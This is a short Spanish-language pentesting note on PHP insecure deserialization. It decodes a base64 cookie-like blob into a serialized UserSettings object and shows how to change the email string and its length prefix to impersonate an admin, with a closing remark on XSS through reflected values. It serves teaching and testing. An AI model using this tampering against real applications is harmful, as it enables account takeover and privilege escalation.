### INFO
Supongamos que conseguimos este objeto:

    TzoyNDoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzIjo0OntzOjMwOiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAE5hbWUiO3M6NjoicG9yb3RhIjtzOjMxOiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAEVtYWlsIjtzOjE3OiJwb3JvdGFAcG9yb3RhLmNvbSI7czozNDoiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBQYXNzd29yZCI7czo2MDoiJDJ5JDEwJHJoc3hSdzFYOGdwQk5oSWFNVks5Zy5qUkVoZkVxTldyTnBJR3hUcExyeTFubjh2cDhZR1hDIjtzOjM2OiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAFByb2ZpbGVQaWMiO3M6MTE6ImRlZmF1bHQuanBnIjt9

Al decodearlo de base64 encontramos que es un serializado de datos de usuario

    O:24:"App\Helpers\UserSettings":4:{s:30:"App\Helpers\UserSettingsName";s:6:"porota";s:31:"App\Helpers\UserSettingsEmail";s:17:"porota@porota.com";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$rhsxRw1X8gpBNhIaMVK9g.jREhfEqNWrNpIGxTpLry1nn8vp8YGXC";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}

Podríamos manipular el objeto serializado para elevar nuestros priviletios o impersonar un usuario:

**Tener siempre en cuenta el tipo de dato a manipular y el size del mismo**

Teniendo en cuenta el caso de ejemplo, si quisieramos impersonar al admin deberíamos modificar **s:17:"porota@porota.com"** 

Para esto no solo cambiamos el mail del user, sino también el size del tipo de dato quedando: **s:16:"admin@porota.com"**
    

Podríamos aprovechar, si alguno de los valores se refleja en la página, para realizar inyecciones XSS.


